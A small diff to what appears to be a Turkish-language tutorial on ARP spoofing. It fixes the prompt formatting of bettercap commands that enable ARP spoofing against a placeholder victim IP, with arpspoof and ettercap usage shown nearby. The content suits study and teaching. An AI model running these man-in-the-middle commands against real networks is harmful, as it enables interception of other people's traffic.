@@ -219,9 +219,9 @@ $ sudo arpspoof -i eth0 -t <kurban_IP> <gateway_IP>
 # 2. bettercap (modern araç):
 $ sudo apt-get install bettercap
 $ sudo bettercap -iface eth0
-$ > net.probe on
-$ > set arp.spoof.targets <kurban_IP>
-$ > arp.spoof on
+> net.probe on
+> set arp.spoof.targets <kurban_IP>
+> arp.spoof on
 
 # 3. ettercap (GUI + CLI):
 # Not: ettercap'ta /IP// biçimi: port boş bırakılır.
